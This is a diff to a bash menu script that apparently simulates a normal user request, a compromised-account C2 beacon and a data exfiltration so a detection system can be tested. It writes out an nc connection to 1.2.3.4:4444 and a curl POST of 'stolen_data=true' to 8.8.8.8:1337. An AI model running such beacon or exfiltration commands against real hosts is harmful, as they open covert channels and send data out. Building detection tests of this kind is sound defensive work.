@@ -21,21 +21,20 @@ while true; do
   echo "4) Exit"
   read -p "Selection: " choice
 
-  case $choice in
+case $choice in
     1)
       echo "[*] Developer pinging standard HTTP port..."
-      # Running as a normal user (UID >= 1000)
-      sudo -u $SUDO_USER curl -s -I http://example.com | head -n 1
+      sudo -u $SUDO_USER curl --max-time 2 -s -I http://example.com | head -n 1
       ;;
     2)
       echo "[!] ALERT: Compromised 'daemon' account attempting C2 Beacon..."
-      # Running as a system user (UID 1) to a weird port triggers the AI
-      sudo -u daemon nc -w 2 1.2.3.4 4444
+      # Added -w 1 (1 second timeout) and & (run in background)
+      sudo -u daemon nc -w 1 1.2.3.4 4444 &
       ;;
     3)
       echo "[!] ALERT: 'www-data' attempting to exfiltrate /etc/passwd..."
-      # Simulates file exfiltration
-      sudo -u daemon curl -s -X POST -d "stolen_data=true" http://8.8.8.8:1337
+      # Added --max-time 2 and & (run in background)
+      sudo -u daemon curl --max-time 2 -s -X POST -d "stolen_data=true" http://8.8.8.8:1337 &
       ;;
     4) exit 0 ;;
   esac
